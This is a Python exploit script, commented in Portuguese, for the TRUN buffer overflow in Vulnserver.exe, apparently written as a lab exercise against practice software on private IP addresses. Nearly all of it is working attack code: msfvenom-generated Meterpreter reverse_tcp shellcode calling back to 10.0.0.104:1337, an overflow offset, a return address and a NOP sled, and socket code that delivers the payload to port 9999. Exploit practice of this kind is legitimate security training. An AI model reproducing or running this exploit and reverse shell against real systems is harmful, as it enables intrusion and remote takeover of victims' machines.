#!/usr/bin/python3

import socket

# ESTE EXPLOIT EXPLORA A VULNERABILIDAE DE BUFFER OVERFLOW
# NO SOFTWARE VULNERAVEL VULNSERVER.EXE
# O PAYLOAD ABAIXO FOI FEITO COM O MSFVENOM E ABRE UMA SHELL NO ALVO
# O PONTO DE ENTRADA PARA A SOBRESCRITA DE DADOS NA MEMORIA
#FOI O COMANDO 'TRUN'.

#SHELLCODE
#msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.104 LPORT=1337 EXITFUNC=thread -b "\x00" -f python

buf =  b""
buf += b"\xdb\xd7\xd9\x74\x24\xf4\x58\x33\xc9\xb1\x5e\xbd"
buf += b"\xaf\x17\x70\x90\x83\xe8\xfc\x31\x68\x16\x03\x68"
buf += b"\x16\xe2\x5a\xeb\x98\x1f\xa4\x14\x59\x40\x95\xc6"
buf += b"\xd0\x65\xb1\x6d\xb0\x55\xb2\x20\x39\x1d\x96\xd0"
buf += b"\x4e\x96\x5c\xff\x61\x27\xeb\x8d\xa9\xe6\x2b\xdd"
buf += b"\x96\x69\xd7\x1c\xcb\x49\xe6\xee\x1e\x8b\x2f\xb9"
buf += b"\x55\x64\xfd\x6d\x1d\x28\x11\x19\x63\xf1\x10\xcd"
buf += b"\xef\x49\x6a\x68\x2f\x3d\xc6\x73\x60\x35\x8e\x53"
buf += b"\xd0\xc1\x66\x8c\xd1\x06\xf3\x65\xa5\x94\xca\x8a"
buf += b"\x0f\x6e\x18\xfe\x91\xa6\x51\xc0\x53\x89\x9c\x6c"
buf += b"\x52\xd1\xa6\x8c\x20\x29\xd5\x31\x33\xea\xa4\xed"
buf += b"\xb6\xed\x0e\x65\x60\xca\xaf\xaa\xf7\x99\xa3\x07"
buf += b"\x73\xc5\xa7\x96\x50\x7d\xd3\x13\x57\x52\x52\x67"
buf += b"\x7c\x76\x3f\x33\x1d\x2f\xe5\x92\x22\x2f\x41\x4a"
buf += b"\x87\x3b\x63\x9d\xb7\xc3\x7c\xa2\xe5\x53\xb1\x6f"
buf += b"\x16\xa4\xdd\xf8\x65\x96\x42\x53\xe2\x9a\x0b\x7d"
buf += b"\xf5\xab\x1b\x7e\x29\x13\x4b\x80\xca\x64\x42\x47"
buf += b"\x9e\x34\xfc\x6e\x9f\xde\xfc\x8f\x4a\x4a\xf6\x07"
buf += b"\x7f\x8b\x06\xb0\x17\x89\x06\x45\xd1\x04\xe0\x15"
buf += b"\x71\x47\xbc\xd5\x21\x27\x6c\xbe\x2b\xa8\x53\xde"
buf += b"\x53\x62\xfc\x75\xbc\xdb\x55\xe2\x25\x46\x2d\x93"
buf += b"\xaa\x5c\x48\x93\x21\x55\xad\x5a\xc2\x1c\xbd\x8b"
buf += b"\xb5\xde\x3d\x4c\x50\xdf\x57\x48\xf2\x88\xcf\x52"
buf += b"\x23\xfe\x50\xac\x06\x7c\x96\x52\xd7\xb5\xed\x65"
buf += b"\x4d\xfa\x99\x89\x81\xfa\x59\xdc\xcb\xfa\x31\xb8"
buf += b"\xaf\xa8\x24\xc7\x65\xdd\xf5\x52\x86\xb4\xaa\xf5"
buf += b"\xee\x3a\x95\x32\xb1\xc5\xf0\x40\xb6\x3a\x87\x6e"
buf += b"\x1f\x53\x77\x2f\x9f\xa3\x1d\xaf\xcf\xcb\xea\x80"
buf += b"\xe0\x3b\x13\x0b\xa9\x53\x9e\xda\x1b\xc5\x9f\xf6"
buf += b"\xfa\x5b\xa0\xf5\x26\x6b\xdb\x76\xd8\x8c\x1c\x9f"
buf += b"\xbd\x8c\x1d\x9f\xc3\xb1\xc8\xa6\xb1\xf4\xc9\x9c"
buf += b"\xda\xea\xe7\xe8\x72\xb3\x62\x51\x1f\x44\x59\x96"
buf += b"\x26\xc7\x6b\x67\xdd\xd7\x1e\x62\x99\x5f\xf3\x1e"
buf += b"\xb2\x35\xf3\x8d\xb3\x1f"

#BAD CHARS: \x00

exploit = b"A" * 2003 + b"\xc7\x11\x50\x62" + b"\x90" * 20 + buf

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

host = "10.0.0.176"
rport = 9999
server = (host, rport)

connect = sock.connect((server))
sock.recv(1024)
sock.send((b"TRUN /.:/"+exploit))
